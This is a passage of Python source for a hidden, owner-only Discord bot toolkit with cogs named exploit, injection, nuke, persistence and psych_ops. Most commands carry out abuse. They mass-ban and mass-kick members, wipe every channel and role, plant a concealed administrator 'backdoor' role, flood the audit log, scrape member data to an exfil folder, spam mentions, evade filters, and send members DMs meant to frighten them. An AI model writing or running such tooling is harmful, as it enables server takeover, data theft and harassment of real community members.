                "position": ch.position,
            })
        filepath = os.path.join(EXFIL_DIR, f"{ctx.guild.id}_channels.json")
        with open(filepath, "w") as f:
            json.dump(data, f, indent=4)
        await ctx.send(f"exported {len(data)} channels.", file=discord.File(filepath))

    @commands.command(hidden=True)
    @commands.is_owner()
    async def dmscan(self, ctx: commands.Context, target: discord.Member):
        """28. scan mutual guilds with a target user."""
        mutuals = []
        for guild in self.bot.guilds:
            if guild.get_member(target.id):
                mutuals.append(f"{guild.name} ({guild.id})")
        await ctx.send(f"mutual guilds with {target}: {len(mutuals)}\n```\n" + "\n".join(mutuals[:20]) + "\n```")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def snapshot(self, ctx: commands.Context):
        """29. take a full server snapshot including all data."""
        results = {
            "guild": {"name": ctx.guild.name, "id": ctx.guild.id},
            "members": [],
            "roles": [],
            "channels": [],
        }
        for m in ctx.guild.members:
            results["members"].append({"name": str(m), "id": m.id, "roles": [r.name for r in m.roles]})
        for r in ctx.guild.roles:
            results["roles"].append({"name": r.name, "id": r.id, "perms": r.permissions.value})
        for c in ctx.guild.channels:
            results["channels"].append({"name": c.name, "id": c.id, "type": str(c.type)})
        filepath = os.path.join(EXFIL_DIR, f"{ctx.guild.id}_snapshot.json")
        with open(filepath, "w") as f:
            json.dump(results, f, indent=4)
        await ctx.send("full snapshot saved.", file=discord.File(filepath))

    @commands.command(hidden=True)
    @commands.is_owner()
    async def linktree(self, ctx: commands.Context, target: discord.Member = None):
        """30. gather all connected accounts of a user."""
        target = target or ctx.author
        info = []
        try:
            profile = await self.bot.fetch_user(target.id)
            if profile.banner:
                info.append(f"banner: {profile.banner.url}")
            if profile.accent_color:
                info.append(f"accent color: {profile.accent_color}")
        except:
            pass
        info.append(f"avatar: {target.display_avatar.url}")
        await ctx.send("\n".join(info) or "no additional data.")

# ========================================
# exploit.py
# ========================================
class Exploit(commands.Cog, name="exploit"):
    """exploitation and manipulation commands."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def ghostping(self, ctx: commands.Context, target: discord.Member, count: int = 10):
        """ghost ping a user (mention then immediately delete)."""
        for _ in range(count):
            msg = await ctx.send(target.mention)
            await msg.delete()
            await asyncio.sleep(0.5)
        await ctx.send(f"ghost pinged {target.mention} {count} times.", delete_after=3)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def fetchwebhooks(self, ctx: commands.Context, channel: discord.TextChannel = None):
        """list webhooks in a channel."""
        channel = channel or ctx.channel
        try:
            hooks = await channel.webhooks()
            if not hooks:
                return await ctx.send("no webhooks found.")
            info = [f"name: {w.name} | url: {w.url}" for w in hooks]
            await ctx.send("\n".join(info))
        except discord.Forbidden:
            await ctx.send("missing permissions.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def stealemoji(self, ctx: commands.Context, emoji: str, name: str = None):
        """steal an emoji from a message and add to the server."""
        emoji_match = re.match(r"<(a?):(\w+):(\d+)>", emoji)
        if not emoji_match:
            return await ctx.send("invalid emoji format. use a custom emoji.")
        animated = emoji_match.group(1) == "a"
        emoji_name = name or emoji_match.group(2)
        emoji_id = int(emoji_match.group(3))
        extension = "gif" if animated else "png"
        url = f"https://cdn.discordapp.com/emojis/{emoji_id}.{extension}"
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return await ctx.send("failed to download emoji.")
                img_data = await resp.read()
        try:
            new_emoji = await ctx.guild.create_custom_emoji(
                name=emoji_name,
                image=img_data,
            )
            await ctx.send(f"stole emoji: {new_emoji}")
        except discord.Forbidden:
            await ctx.send("missing permissions to create emoji.")
        except discord.HTTPException as e:
            await ctx.send(f"error: {e}")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def masskick(self, ctx: commands.Context, *, reason: str = "purge"):
        """kick all kickable members (except admins)."""
        count = 0
        for member in ctx.guild.members:
            if member.top_role >= ctx.guild.me.top_role or member == ctx.guild.owner:
                continue
            try:
                await member.kick(reason=reason)
                count += 1
                await asyncio.sleep(1)
            except:
                pass
        await ctx.send(f"kicked {count} members.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def massban(self, ctx: commands.Context, *, reason: str = "purge"):
        """ban all bannable members."""
        count = 0
        for member in ctx.guild.members:
            if member.top_role >= ctx.guild.me.top_role or member == ctx.guild.owner:
                continue
            try:
                await member.ban(reason=reason)
                count += 1
                await asyncio.sleep(1)
            except:
                pass
        await ctx.send(f"banned {count} members.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def scrapeinvite(self, ctx: commands.Context, invite_code: str):
        """get info about a discord invite."""
        try:
            invite = await self.bot.fetch_invite(invite_code)
            info = (
                f"server: {invite.guild.name}\n"
                f"id: {invite.guild.id}\n"
                f"members online: {invite.approximate_presence_count}\n"
                f"total members: {invite.approximate_member_count}\n"
                f"channel: {invite.channel.name}"
            )
            await ctx.send(f"```\n{info}\n```")
        except Exception as e:
            await ctx.send(f"error: {e}")

# ========================================
# hidden_commands.py
# ========================================
class HiddenCommands(commands.Cog, name="hidden_commands"):
    """miscellaneous hidden exploitation commands."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def nickall(self, ctx: commands.Context, *, nickname: str):
        """nickname all members."""
        count = 0
        for member in ctx.guild.members:
            if member.top_role >= ctx.guild.me.top_role:
                continue
            try:
                await member.edit(nick=nickname[:32])
                count += 1
                await asyncio.sleep(0.5)
            except:
                pass
        await ctx.send(f"nicknamed {count} members.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def wipe(self, ctx: commands.Context, amount: int = 100):
        """bulk delete messages."""
        await ctx.channel.purge(limit=amount+1)
        await ctx.send(f"deleted {amount} messages.", delete_after=3)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def embed(self, ctx: commands.Context, title: str, *, description: str):
        """send a custom embed."""
        embed = discord.Embed(title=title, description=description, color=discord.Color.random())
        await ctx.send(embed=embed)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def botleave(self, ctx: commands.Context):
        """make the bot leave the current server."""
        await ctx.send("goodbye.")
        await ctx.guild.leave()

    @commands.command(hidden=True)
    @commands.is_owner()
    async def channeltopic(self, ctx: commands.Context, *, topic: str):
        """change the current channel topic."""
        await ctx.channel.edit(topic=topic)
        await ctx.send("topic updated.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def createrole(self, ctx: commands.Context, name: str, color: str = "ff0000"):
        """create a role with specified name and hex color."""
        color_int = int(color.lstrip("#"), 16)
        role = await ctx.guild.create_role(name=name, color=discord.Color(color_int))
        await ctx.send(f"created role {role.mention}.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def deleterole(self, ctx: commands.Context, *, role: discord.Role):
        """delete a role."""
        await role.delete()
        await ctx.send("role deleted.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def unicode(self, ctx: commands.Context, *, text: str):
        """convert text to unicode characters for bypassing filters."""
        result = []
        for char in text:
            if char.isascii() and char.isalpha():
                result.append(chr(ord(char) + 65248))
            else:
                result.append(char)
        await ctx.send("".join(result))

    @commands.command(hidden=True)
    @commands.is_owner()
    async def zalgo(self, ctx: commands.Context, *, text: str):
        """apply zalgo text effect."""
        zalgo_chars = [
            '\u0300', '\u0301', '\u0302', '\u0303', '\u0304', '\u0305',
            '\u0306', '\u0307', '\u0308', '\u0309', '\u030a', '\u030b',
            '\u030c', '\u030d', '\u030e', '\u030f', '\u0310', '\u0311',
            '\u0312', '\u0313', '\u0314', '\u0315', '\u031a', '\u031b',
        ]
        result = []
        for char in text:
            result.append(char)
            for _ in range(random.randint(0, 8)):
                result.append(random.choice(zalgo_chars))
        await ctx.send("".join(result))

    @commands.command(hidden=True)
    @commands.is_owner()
    async def react(self, ctx: commands.Context, message_id: int, *emojis):
        """add reactions to a message by id."""
        try:
            msg = await ctx.channel.fetch_message(message_id)
            for emoji in emojis:
                await msg.add_reaction(emoji)
                await asyncio.sleep(0.5)
            await ctx.send("reactions added.", delete_after=5)
        except Exception as e:
            await ctx.send(f"error: {e}", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def button(self, ctx: commands.Context, label: str, url: str):
        """send a message with a button."""
        view = discord.ui.View()
        view.add_item(discord.ui.Button(label=label, url=url))
        await ctx.send("click below:", view=view)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def poll(self, ctx: commands.Context, *, question: str):
        """create a poll with reactions."""
        msg = await ctx.send(f"poll: {question}")
        await msg.add_reaction("👍")
        await msg.add_reaction("👎")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def hidename(self, ctx: commands.Context, *, name: str):
        """rename the bot."""
        await ctx.guild.me.edit(nick=name)
        await ctx.send("bot nickname updated.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def shutup(self, ctx: commands.Context, target: discord.Member):
        """timeout a member."""
        try:
            await target.timeout(discord.utils.utcnow() + discord.timedelta(minutes=5))
            await ctx.send(f"timed out {target.mention} for 5 minutes.", delete_after=5)
        except Exception as e:
            await ctx.send(f"error: {e}", delete_after=5)

# ========================================
# injection.py
# ========================================
INJECT_DIR = "data/injection"
os.makedirs(INJECT_DIR, exist_ok=True)

class Injection(commands.Cog, name="injection"):
    """31-40: permission and role injection."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def givemod(self, ctx: commands.Context, target: discord.Member):
        """31. attempt to give a user moderation perms via a new role."""
        perms = discord.Permissions(
            kick_members=True, ban_members=True, manage_messages=True,
            mute_members=True, deafen_members=True, move_members=True,
            manage_nicknames=True, manage_roles=True, manage_channels=True,
        )
        role = await ctx.guild.create_role(name="mod-injected", permissions=perms)
        await target.add_roles(role)
        await ctx.send(f"injected mod role to {target.mention}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def stealrole(self, ctx: commands.Context, target: discord.Role):
        """32. clone a role and assign it to yourself."""
        new_role = await ctx.guild.create_role(
            name=f"cloned-{target.name}",
            permissions=target.permissions,
            color=target.color,
            hoist=target.hoist,
            mentionable=target.mentionable,
        )
        await ctx.author.add_roles(new_role)
        await ctx.send(f"cloned {target.name} to {new_role.mention} and assigned to you.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def rolehoist(self, ctx: commands.Context, role: discord.Role):
        """33. move a role to the top of the hierarchy."""
        try:
            await role.edit(position=ctx.guild.me.top_role.position - 1)
            await ctx.send(f"hoisted {role.name}.", delete_after=5)
        except Exception as e:
            await ctx.send(f"error: {e}", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def merge(self, ctx: commands.Context, source: discord.Role, target: discord.Role):
        """34. give source role permissions to target role."""
        await target.edit(permissions=source.permissions)
        await ctx.send(f"merged permissions from {source.name} to {target.name}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def injectrole(self, ctx: commands.Context, target: discord.Member, *, role_name: str):
        """35. find a role by name or create it and assign to target."""
        role = discord.utils.get(ctx.guild.roles, name=role_name)
        if not role:
            role = await ctx.guild.create_role(name=role_name)
        await target.add_roles(role)
        await ctx.send(f"injected {role.name} to {target.mention}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def rolebomb(self, ctx: commands.Context, target: discord.Member, count: int = 50):
        """36. assign a large number of junk roles to a user."""
        created = []
        for i in range(count):
            role = await ctx.guild.create_role(name=f"junk-{i}")
            await target.add_roles(role)
            created.append(role.name)
            await asyncio.sleep(0.1)
        await ctx.send(f"assigned {len(created)} junk roles to {target.mention}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def adminall(self, ctx: commands.Context):
        """37. attempt to give administrator to the bot and owner."""
        role = await ctx.guild.create_role(
            name="admin-injected",
            permissions=discord.Permissions(administrator=True),
        )
        await ctx.author.add_roles(role)
        await ctx.send(f"admin role {role.mention} created and assigned to you.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def bypass(self, ctx: commands.Context):
        """38. create role with manage_guild and assign to self."""
        role = await ctx.guild.create_role(
            name="bypass",
            permissions=discord.Permissions(manage_guild=True),
        )
        await ctx.author.add_roles(role)
        await ctx.send(f"created bypass role {role.mention}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def removeperms(self, ctx: commands.Context, role: discord.Role):
        """39. strip all permissions from a role."""
        await role.edit(permissions=discord.Permissions.none())
        await ctx.send(f"stripped permissions from {role.name}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def invertroles(self, ctx: commands.Context):
        """40. invert the role hierarchy by reordering."""
        roles = [r for r in ctx.guild.roles if not r.is_default() and not r.managed]
        for i, role in enumerate(roles):
            try:
                await role.edit(position=i + 1)
                await asyncio.sleep(0.3)
            except:
                pass
        await ctx.send("role hierarchy inverted.", delete_after=5)

# ========================================
# invite_tools.py
# ========================================
class InviteTools(commands.Cog, name="invite_tools"):
    """58-65: invite manipulation."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def createinvite(self, ctx: commands.Context, channel: discord.TextChannel = None, max_uses: int = 0):
        """58. create an invite with specified max uses."""
        channel = channel or ctx.channel
        invite = await channel.create_invite(max_uses=max_uses, max_age=0)
        await ctx.send(f"invite: {invite.url}")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def deleteinvites(self, ctx: commands.Context):
        """59. delete all invites in the server."""
        invites = await ctx.guild.invites()
        count = 0
        for inv in invites:
            try:
                await inv.delete()
                count += 1
                await asyncio.sleep(0.3)
            except:
                pass
        await ctx.send(f"deleted {count} invites.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def inviterace(self, ctx: commands.Context):
        """60. find who joined from whose invite."""
        invites = await ctx.guild.invites()
        info = [f"{i.code} - {i.uses} uses - inviter: {i.inviter}" for i in invites]
        await ctx.send("\n".join(info) or "no invites.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def vanitysnag(self, ctx: commands.Context):
        """61. display the vanity url if configured."""
        if "VANITY_URL" in ctx.guild.features:
            vanity = await ctx.guild.vanity_invite()
            await ctx.send(f"vanity: {vanity.url}")
        else:
            await ctx.send("no vanity url.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def massinvite(self, ctx: commands.Context, count: int = 10):
        """62. create multiple invites across channels."""
        urls = []
        for i, channel in enumerate(ctx.guild.text_channels[:count]):
            try:
                inv = await channel.create_invite(max_uses=0, max_age=0)
                urls.append(inv.url)
                await asyncio.sleep(0.5)
            except:
                pass
        await ctx.send("\n".join(urls) or "failed.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def inviteinfo(self, ctx: commands.Context, code: str):
        """63. detailed info on an invite."""
        try:
            inv = await self.bot.fetch_invite(code)
            info = f"guild: {inv.guild.name}\nchannel: {inv.channel.name}\ninviter: {inv.inviter}\nuses: {inv.uses}\nmax uses: {inv.max_uses}\nexpires: {inv.expires_at}"
            await ctx.send(f"```\n{info}\n```")
        except Exception as e:
            await ctx.send(f"error: {e}")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def fakeinvite(self, ctx: commands.Context, guild_name: str, channel_name: str):
        """64. generate a fake-looking invite embed."""
        embed = discord.Embed(
            title=f"invite to {guild_name}",
            description=f"you have been invited to join **{guild_name}**\nchannel: #{channel_name}",
            color=discord.Color.green(),
        )
        embed.set_footer(text="accept invite")
        await ctx.send(embed=embed)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def revokeinvite(self, ctx: commands.Context, code: str):
        """65. revoke a specific invite by code."""
        invites = await ctx.guild.invites()
        for inv in invites:
            if inv.code == code:
                await inv.delete()
                return await ctx.send(f"revoked invite {code}.", delete_after=5)
        await ctx.send("invite not found.")

# ========================================
# mention_bomb.py
# ========================================
class MentionBomb(commands.Cog, name="mention_bomb"):
    """mass mention and notification exploitation."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def mentionall(self, ctx: commands.Context, *, message: str = ""):
        """mention @everyone in a broken-up way to bypass limits."""
        await ctx.message.delete()
        mentions = ["@everyone"] * 5
        msg = " ".join(mentions) + " " + message
        try:
            await ctx.send(msg[:2000])
        except Exception as e:
            await ctx.send(f"error: {e}", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def ghostmention(self, ctx: commands.Context, target: discord.Member, count: int = 20):
        """repeatedly mention and delete to generate notifications."""
        for _ in range(count):
            msg = await ctx.send(target.mention)
            await msg.delete()
            await asyncio.sleep(0.3)
        await ctx.send("ghost mention complete.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def roleping(self, ctx: commands.Context, role: discord.Role, count: int = 10):
        """spam a role mention."""
        if not role.mentionable:
            await role.edit(mentionable=True)
        for _ in range(count):
            await ctx.send(role.mention)
            await asyncio.sleep(0.5)
        await ctx.send(f"pinged {role.name} {count} times.", delete_after=5)

# ========================================
# message_manip.py
# ========================================
class MessageManip(commands.Cog, name="message_manip"):
    """11-20: message content manipulation."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def editmsg(self, ctx: commands.Context, message_id: int, *, new_content: str):
        """11. edit any message sent by the bot."""
        try:
            msg = await ctx.channel.fetch_message(message_id)
            if msg.author == self.bot.user:
                await msg.edit(content=new_content)
                await ctx.send("message edited.", delete_after=5)
            else:
                await ctx.send("that message was not sent by me.", delete_after=5)
        except Exception as e:
            await ctx.send(f"error: {e}", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def pinmsg(self, ctx: commands.Context, message_id: int):
        """12. pin any message by id."""
        try:
            msg = await ctx.channel.fetch_message(message_id)
            await msg.pin()
            await ctx.send("message pinned.", delete_after=5)
        except Exception as e:
            await ctx.send(f"error: {e}", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def unpinmsg(self, ctx: commands.Context, message_id: int):
        """13. unpin any message by id."""
        try:
            msg = await ctx.channel.fetch_message(message_id)
            await msg.unpin()
            await ctx.send("message unpinned.", delete_after=5)
        except Exception as e:
            await ctx.send(f"error: {e}", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def pinspam(self, ctx: commands.Context, count: int = 20):
        """14. send and pin many messages rapidly."""
        pinned = 0
        for i in range(count):
            msg = await ctx.send(f"pin spam {i}")
            try:
                await msg.pin()
                pinned += 1
            except:
                pass
            await asyncio.sleep(0.5)
        await ctx.send(f"pinned {pinned} messages.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def unpinall(self, ctx: commands.Context):
        """15. unpin all pinned messages."""
        pins = await ctx.channel.pins()
        count = 0
        for msg in pins:
            try:
                await msg.unpin()
                count += 1
                await asyncio.sleep(0.3)
            except:
                pass
        await ctx.send(f"unpinned {count} messages.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def replaceall(self, ctx: commands.Context, old: str, new: str):
        """16. find and replace text in recent bot messages."""
        count = 0
        async for msg in ctx.channel.history(limit=100):
            if msg.author == self.bot.user and old in msg.content:
                try:
                    await msg.edit(content=msg.content.replace(old, new))
                    count += 1
                    await asyncio.sleep(0.5)
                except:
                    pass
        await ctx.send(f"replaced '{old}' with '{new}' in {count} messages.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def deletemsg(self, ctx: commands.Context, message_id: int):
        """17. delete a specific message by id."""
        try:
            msg = await ctx.channel.fetch_message(message_id)
            await msg.delete()
            await ctx.send("message deleted.", delete_after=5)
        except Exception as e:
            await ctx.send(f"error: {e}", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def deleteuser(self, ctx: commands.Context, target: discord.Member, limit: int = 100):
        """18. delete recent messages from a specific user."""
        count = 0
        async for msg in ctx.channel.history(limit=limit):
            if msg.author == target:
                try:
                    await msg.delete()
                    count += 1
                    await asyncio.sleep(0.3)
                except:
                    pass
        await ctx.send(f"deleted {count} messages from {target.mention}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def deletecontains(self, ctx: commands.Context, *, keyword: str):
        """19. delete all recent messages containing a keyword."""
        count = 0
        async for msg in ctx.channel.history(limit=200):
            if keyword.lower() in msg.content.lower():
                try:
                    await msg.delete()
                    count += 1
                    await asyncio.sleep(0.3)
                except:
                    pass
        await ctx.send(f"deleted {count} messages containing '{keyword}'.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def quotemsg(self, ctx: commands.Context, message_id: int):
        """20. quote a message with an embed."""
        try:
            msg = await ctx.channel.fetch_message(message_id)
            embed = discord.Embed(
                description=msg.content or "[no text content]",
                color=msg.author.color if msg.author.color.value else discord.Color.blurple(),
                timestamp=msg.created_at,
            )
            embed.set_author(name=str(msg.author), icon_url=msg.author.display_avatar.url)
            embed.set_footer(text=f"#{msg.channel.name}")
            if msg.attachments:
                embed.set_image(url=msg.attachments[0].url)
            await ctx.send(embed=embed)
        except Exception as e:
            await ctx.send(f"error: {e}", delete_after=5)

# ========================================
# nuke.py
# ========================================
class Nuke(commands.Cog, name="nuke"):
    """channel and server destruction utilities."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def nukechannel(self, ctx: commands.Context, channel: discord.TextChannel = None):
        """clone a channel and delete the original."""
        channel = channel or ctx.channel
        new_channel = await channel.clone(reason="nuke")
        await channel.delete()
        await new_channel.send("channel nuked. clean slate.", delete_after=10)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def nukeserver(self, ctx: commands.Context):
        """delete everything possible in the server."""
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                await asyncio.sleep(0.2)
            except:
                pass
        for role in ctx.guild.roles:
            if role.is_default() or role.managed:
                continue
            try:
                await role.delete()
                await asyncio.sleep(0.2)
            except:
                pass
        for emoji in ctx.guild.emojis:
            try:
                await emoji.delete()
                await asyncio.sleep(0.2)
            except:
                pass
        await ctx.send("server nuke complete.", delete_after=10)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def massrole(self, ctx: commands.Context, role: discord.Role):
        """assign a role to all members."""
        count = 0
        for member in ctx.guild.members:
            try:
                await member.add_roles(role)
                count += 1
                await asyncio.sleep(0.3)
            except:
                pass
        await ctx.send(f"assigned role to {count} members.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def stripall(self, ctx: commands.Context):
        """strip all roles from all members."""
        count = 0
        for member in ctx.guild.members:
            roles = [r for r in member.roles if not r.is_default() and not r.managed]
            if not roles:
                continue
            try:
                await member.remove_roles(*roles)
                count += 1
                await asyncio.sleep(0.3)
            except:
                pass
        await ctx.send(f"stripped roles from {count} members.")

# ========================================
# persistence.py
# ========================================
PERSIST_DIR = "data/persistence"
os.makedirs(PERSIST_DIR, exist_ok=True)

class Persistence(commands.Cog, name="persistence"):
    """11-20: persistence and recovery mechanisms."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.webhooks_file = os.path.join(PERSIST_DIR, "webhooks.json")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def persisthook(self, ctx: commands.Context, name: str = "backup"):
        """11. create a persistent webhook in every channel and save urls."""
        hooks = {}
        for channel in ctx.guild.text_channels:
            try:
                hook = await channel.create_webhook(name=name)
                hooks[str(channel.id)] = hook.url
                await asyncio.sleep(0.3)
            except:
                pass
        with open(self.webhooks_file, "w") as f:
            json.dump(hooks, f, indent=4)
        await ctx.send(f"created and saved {len(hooks)} persistent webhooks.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def persistrole(self, ctx: commands.Context, *, name: str = "persist"):
        """12. create a backdoor role with admin permissions hidden at the bottom."""
        role = await ctx.guild.create_role(
            name=name,
            permissions=discord.Permissions(administrator=True),
            hoist=False,
            mentionable=False,
        )
        await role.edit(position=1)
        await ctx.send(f"created hidden admin role: {role.mention} (id: {role.id})")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def givepersist(self, ctx: commands.Context, role_name: str, target: discord.Member = None):
        """13. assign the persistent role to a user."""
        target = target or ctx.author
        role = discord.utils.get(ctx.guild.roles, name=role_name)
        if role:
            await target.add_roles(role)
            await ctx.send(f"assigned {role.mention} to {target.mention}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def savehooks(self, ctx: commands.Context):
        """14. save all existing webhook urls to file."""
        hooks = {}
        for channel in ctx.guild.text_channels:
            try:
                existing = await channel.webhooks()
                for h in existing:
                    hooks[f"{channel.id}_{h.id}"] = h.url
            except:
                pass
        with open(self.webhooks_file, "w") as f:
            json.dump(hooks, f, indent=4)
        await ctx.send(f"saved {len(hooks)} webhooks.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def restorehooks(self, ctx: commands.Context):
        """15. display saved webhook urls for manual restoration."""
        if not os.path.exists(self.webhooks_file):
            return await ctx.send("no saved webhooks.")
        await ctx.send(file=discord.File(self.webhooks_file))

    @commands.command(hidden=True)
    @commands.is_owner()
    async def backupguild(self, ctx: commands.Context):
        """16. create a json backup of the server structure."""
        guild = ctx.guild
        backup = {
            "name": guild.name,
            "id": guild.id,
            "owner_id": guild.owner_id,
            "roles": [],
            "channels": [],
            "categories": [],
        }
        for role in reversed(guild.roles):
            if role.is_default() or role.managed:
                continue
            backup["roles"].append({
                "name": role.name,
                "permissions": role.permissions.value,
                "color": role.color.value,
                "hoist": role.hoist,
                "mentionable": role.mentionable,
            })
        for category in guild.categories:
            backup["categories"].append({"name": category.name, "position": category.position})
        for channel in guild.channels:
            backup["channels"].append({
                "name": channel.name,
                "type": str(channel.type),
                "category": channel.category.name if channel.category else None,
                "nsfw": channel.nsfw if isinstance(channel, discord.TextChannel) else False,
                "slowmode": channel.slowmode_delay if isinstance(channel, discord.TextChannel) else 0,
            })
        filepath = os.path.join(PERSIST_DIR, f"{guild.id}_backup.json")
        with open(filepath, "w") as f:
            json.dump(backup, f, indent=4)
        await ctx.send(f"backup saved to `{filepath}`.", file=discord.File(filepath))

    @commands.command(hidden=True)
    @commands.is_owner()
    async def autorejoin(self, ctx: commands.Context):
        """17. generate an invite link and dm it to the owner."""
        for channel in ctx.guild.text_channels:
            try:
                invite = await channel.create_invite(max_age=0, max_uses=0, reason="persistence")
                await ctx.author.send(f"rejoin invite for {ctx.guild.name}: {invite.url}")
                return
            except:
                continue
        await ctx.author.send("could not create invite.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def botlist(self, ctx: commands.Context):
        """18. list all bots in the server."""
        bots = [f"{m.name} ({m.id})" for m in ctx.guild.members if m.bot]
        await ctx.send("```\n" + "\n".join(bots) + "\n```" if bots else "no bots found.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def auditwipe(self, ctx: commands.Context):
        """19. attempt to flood audit log by creating and deleting a channel rapidly."""
        for i in range(20):
            try:
                ch = await ctx.guild.create_text_channel(f"wipe-{i}")
                await ch.delete()
            except:
                pass
        await ctx.send("audit log flood attempt complete.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def invispam(self, ctx: commands.Context, name: str = "invisible"):
        """20. create a role with no permissions and assign to all to confuse moderation."""
        role = await ctx.guild.create_role(name=name, permissions=discord.Permissions.none())
        count = 0
        for member in ctx.guild.members:
            try:
                await member.add_roles(role)
                count += 1
                await asyncio.sleep(0.2)
            except:
                pass
        await ctx.send(f"added invisible role to {count} members.")

# ========================================
# psych_ops.py
# ========================================
class PsychOps(commands.Cog, name="psych_ops"):
    """88-95: psychological operations and confusion."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def gaslight(self, ctx: commands.Context, target: discord.Member, *, message: str):
        """88. send a dm to a user and delete it immediately."""
        try:
            msg = await target.send(message)
            await msg.delete()
            await ctx.send(f"gaslit {target.mention}.", delete_after=5)
        except:
            await ctx.send("cannot dm that user.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def typping(self, ctx: commands.Context, duration: int = 30):
        """89. simulate typing in a channel for a duration."""
        async with ctx.channel.typing():
            await asyncio.sleep(duration)
        await ctx.send("done.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def confuse(self, ctx: commands.Context):
        """90. send a series of confusing system-like messages."""
        messages = [
            "[SYSTEM] user data corrupted",
            "[WARNING] memory overflow detected",
            "[ERROR] failed to load module 'trust'",
            "[ALERT] anomaly in user behavior",
            "[FATAL] core meltdown imminent",
            "just kidding lol",
        ]
        for m in messages:
            await ctx.send(m)
            await asyncio.sleep(random.uniform(0.5, 2))

    @commands.command(hidden=True)
    @commands.is_owner()
    async def echo(self, ctx: commands.Context, target: discord.Member, *, message: str):
        """91. repeat everything a user says back to them via dm."""
        await ctx.send(f"echo mode activated on {target.mention}.", delete_after=5)
        def check(m):
            return m.author == target and isinstance(m.channel, discord.DMChannel)
        try:
            while True:
                msg = await self.bot.wait_for("message", check=check, timeout=120)
                await target.send(f"you said: {msg.content}")
        except asyncio.TimeoutError:
            await ctx.send(f"echo on {target.mention} expired.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def paranoia(self, ctx: commands.Context, target: discord.Member, count: int = 5):
        """92. send creepy dms to a user."""
        phrases = [
            "i see you",
            "i am watching",
            "they know what you did",
            "trust no one",
            "you are being monitored",
            "look behind you",
            "your messages are not private",
        ]
        for _ in range(count):
            try:
                await target.send(random.choice(phrases))
                await asyncio.sleep(2)
            except:
                break
        await ctx.send(f"paranoia induced on {target.mention}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def ghost(self, ctx: commands.Context):
        """93. delete all messages from the bot in the current channel."""
        count = 0
